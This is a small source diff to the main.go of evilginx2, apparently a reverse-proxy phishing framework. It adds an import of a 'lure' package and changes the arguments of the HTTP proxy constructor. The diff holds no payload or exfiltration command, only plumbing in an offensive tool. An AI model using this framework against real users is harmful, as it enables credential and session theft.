@@ -13,6 +13,7 @@ import (
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/lure"
 	"go.uber.org/zap"
 
 	"github.com/fatih/color"
@@ -170,7 +171,7 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, nil)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
